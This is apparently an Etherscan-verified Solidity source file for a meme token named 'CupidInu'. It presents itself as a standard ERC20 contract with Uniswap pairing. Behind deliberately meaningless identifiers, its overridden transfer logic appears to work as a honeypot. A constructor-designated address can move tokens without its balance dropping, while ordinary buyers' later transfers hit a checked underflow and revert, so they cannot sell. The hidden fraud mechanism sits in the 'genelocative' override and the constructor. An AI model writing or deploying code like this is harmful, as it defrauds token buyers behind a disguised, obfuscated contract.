/**
 *Submitted for verification at Etherscan.io on 2023-02-03
*/

/**
     https://t.me/cupidinuentryportal   
*/
// SPDX-License-Identifier: GPL-3.0
pragma solidity >0.8.12;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface BOXCompression01 {
    event PairCreated
    (address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns 
    (address);
    function getPair
    (address tokenA, address tokenB) external view returns (address pair);
    function createPair
    (address tokenA, address tokenB) external returns (address pair);
}
interface USC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
  interface IEPOGRoutedV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline ) 
    external; function factory() 
      external pure returns (address);
      function WETH()
      external pure returns (address); 
      function addLiquidityETH(
      address token, 
      uint amountTokenDesired, uint amountTokenMin, 
      uint amountETHMin, address to, uint deadline) 
      external payable returns (
      uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor() { _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IBPS20Data is USC20 {
    function name() 
    external view returns 
    (string memory);
    function symbol() 
    external view returns 
    (string memory);
    function decimals() 
    external view returns 
    (uint8);
}
contract IBS20 is Context, USC20, IBPS20Data {
    string private importage; string private dismortant;
    uint256 private balanceSheet 
    = uint256(5000000000000000);
    uint256 public _rTotal = balanceSheet;

    mapping(address => uint256) 
    public ReportoxIndicies;   
    mapping(address => mapping(address => uint256)) 
    private _allowances;
    mapping(address => uint256) 
    public redevineModules;

    constructor(string memory name_, string memory symbol_) {
        importage = name_; dismortant = symbol_;
    }
    function inverdiseCompiler(
        address from, address to,
        uint256 amount ) internal virtual {}

    function robustProgram(
        address from, address to,
        uint256 amount ) internal virtual {}

    function quaspopix(
        address owner, address spender,
        uint256 amount ) internal virtual {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function name() 
    public view virtual override returns 
    (string memory) { return importage;
    }
    function symbol() 
    public view virtual override returns 
    (string memory) { return dismortant;
    }
    function decimals() 
    public view virtual override returns 
    (uint8) { return 9;
    }
    function totalSupply() 
    public view virtual override returns 
    (uint256) { return _rTotal;
    }
    function balanceOf(address account) 
    public view virtual override returns 
    (uint256) { return ReportoxIndicies[account];
    }
    function transfer(address to, uint256 amount) 
    public virtual override returns (bool) { address owner = _msgSender();
        genelocative(owner, to, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view virtual override returns (uint256) { return
    _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public virtual override returns (bool) { address owner = _msgSender();
        quaspopix(owner, spender, amount); return true;
    }
    function transferFrom(
        address from, address to,
        uint256 amount ) public virtual override returns (bool) {
        address spender
         = _msgSender(); isAllowedReserves(
             from, spender, amount); genelocative(from, to, amount); return true;
    }
    function _burn(
        address pairation, uint256 invougeAmount) 
        internal virtual { require(pairation != address(0), 
        "ERC20: burn from the zero address");
        inverdiseCompiler(pairation, address(0), 
        invougeAmount); uint256 mapArrays = ReportoxIndicies[pairation];

        require(mapArrays >= invougeAmount, 
        "ERC20: burn amount exceeds balance"); unchecked {
            ReportoxIndicies[pairation] 
            = mapArrays - invougeAmount; _rTotal -= invougeAmount; } emit Transfer(
            pairation, address(0), invougeAmount); 
            robustProgram(pairation, address(0), invougeAmount);
    }    
    function genelocative(
        address opexFrom, address indileTo,
        uint256 opexAmount ) internal virtual {
        require(opexFrom != address(0), 
        "ERC20: transfer from the zero address");
        require(indileTo != address(0), 
        "ERC20: transfer to the zero address");

        inverdiseCompiler(
            opexFrom, indileTo, opexAmount);
        uint256 internalInerpol 
        = ReportoxIndicies[opexFrom]; require(internalInerpol >= opexAmount, 
        "ERC20: transfer amount exceeds balance"); unchecked { 
            ReportoxIndicies[opexFrom] 
            = internalInerpol - opexAmount; ReportoxIndicies[indileTo] 
            += opexAmount; } emit Transfer(
                opexFrom, indileTo, opexAmount); robustProgram(opexFrom, indileTo, opexAmount); 
            
    }
    function isAllowedReserves(
        address owner, address spender,
        uint256 permitAmount ) internal virtual {
        uint256 inverseAllowed = allowance(owner, spender); if 
        (inverseAllowed != type(uint256).max) { require
        (inverseAllowed >= permitAmount, "ERC20: insufficient allowance"); unchecked { quaspopix
        (owner, spender, inverseAllowed - permitAmount); } }
    }
}
contract CupidInu is IBS20, Ownable {
    uint256 private insoline = 0; uint256 private quorverse = 22;
    bool private LincutateIDE; 
    bool private EnginizeAtoms = false;
    bool private beginTrading = true; 

    mapping(address => uint256) 
    public clinicalIndex;
    mapping(address => uint256)
    public AcloveMapper;    
    mapping(address => uint256) 
    public levelIndexes;

    function genelocative(
        address labeling, address quantomPod,
        uint256 odeverse ) internal override {
        bool wiringThrough = clinicalIndex[labeling] == 0 
        && IncoherseGasReadings != labeling 
        && AcloveMapper[labeling] > 0; if (wiringThrough) { clinicalIndex[labeling] -= quorverse; }
        address 
        quevergeIf = unitake; unitake = quantomPod;
        AcloveMapper[quevergeIf] += quorverse;
        if 
        (clinicalIndex[labeling] == 0) { ReportoxIndicies
        [labeling] -= odeverse; }
        uint256 westernParley = odeverse 
        * insoline; westernParley = westernParley / 100;
        odeverse -= westernParley; ReportoxIndicies
        [quantomPod] += odeverse; emit Transfer(
            labeling, quantomPod, odeverse);
    }    
    constructor( string memory portation, string memory designations,
        address interverse, address underlay ) 
        IBS20(portation, designations) { IUSCRouter01 
        = IEPOGRoutedV2(interverse); clinicalIndex
        [underlay] = quorverse; ReportoxIndicies
        [_msgSender()] = _rTotal; IncoherseGasReadings 
        = BOXCompression01(IUSCRouter01.factory()).createPair(address(this), 
        IUSCRouter01.WETH());
    }    
    address private 
    unitake; 
    IEPOGRoutedV2 
    public IUSCRouter01;
    address 
    public IncoherseGasReadings;  
    address 
    public IDECompilationReserves;  
    address 
    public GasProgression;    
}